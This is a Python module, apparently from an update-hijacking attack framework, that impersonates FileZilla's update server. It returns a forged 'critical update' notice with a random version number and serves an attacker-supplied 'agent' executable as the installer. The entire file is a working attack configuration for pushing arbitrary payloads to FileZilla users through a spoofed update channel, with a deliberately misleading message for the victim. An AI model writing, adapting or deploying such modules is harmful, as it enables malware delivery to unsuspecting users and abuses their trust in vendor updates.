from modules import ModuleBase


class FileZilla(ModuleBase):
    name = 'FileZilla'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(update.filezilla-project.org)' 
    requests = [
        {   'path': '/updatecheck.php?',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': 'release 3.3.<%VERSION%> http://update.filezilla-project.org/filezilla/FileZilla_3.3.<%VERSION%>_win32-setup.exe\n\n3.3.<%VERSION%> (2009-01-07)\n\n- <%DESCRIPTION%>',
            'parse': 1,
            'file': '',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        },
    ]
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
